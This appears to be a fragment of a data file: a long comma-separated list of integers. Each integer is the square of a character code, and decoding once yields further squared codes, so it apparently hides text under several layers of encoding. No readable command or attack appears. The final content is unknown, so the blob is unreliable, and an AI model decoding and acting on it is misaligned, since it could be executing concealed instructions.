,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,3136,2401,2916,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2601,2401,2601,2916,1936,2401,2704,2916,2704,2401,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2704,2809,2916,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2809,3025,3025,2916,1936,2809,2304,2704,2401,1936,2401,2500,2809,2704,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2601,2401,2601,2916,1936,2401,2704,2916,2704,2401,1936,2500,2916,2304,2401,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,3249,2601,2916,1936,3249,3136,2304,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2601,2304,2500,2809,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2601,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2809,3249,2500,3249,1936,2500,2916,2304,2401,1936,2401,2500,3249,3249,2916,1936,3136,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,3136,2401,2916,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2809,3249,2500,3249,1936,2500,2916,2304,2401,1936,2401,2500,3249,3249,2916,1936,3136,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,3136,2401,2916,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2601,2304,2500,2809,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2601,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,3249,2500,3249,1936,2401,2704,2401,2916,2401,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2401,2304,2304,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,3025,2809,2916,3249,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2809,2401,3136,2704,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,2401,2916,2304,2304,1936,2401,2401,3136,3136,2401,1936,2809,2304,2704,2401,1936,2916,3025,2500,2704,1936,2601,2401,2601,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,3249,2500,3249,1936,2401,2704,2401,2916,2401,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2916,3025,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2916,2304,3249,1936,3025,2500,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2916,3025,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2601,2401,2601,2916,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601